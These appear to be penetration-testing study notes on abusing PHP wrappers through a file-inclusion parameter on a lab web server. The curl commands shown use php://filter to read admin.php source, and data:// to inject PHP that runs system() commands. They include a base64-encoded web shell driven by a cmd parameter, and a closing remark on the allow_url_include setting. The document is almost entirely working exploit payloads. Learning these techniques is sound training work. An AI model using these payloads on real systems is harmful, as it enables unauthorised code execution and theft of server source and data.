php://filter

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

php://data

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

- data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled.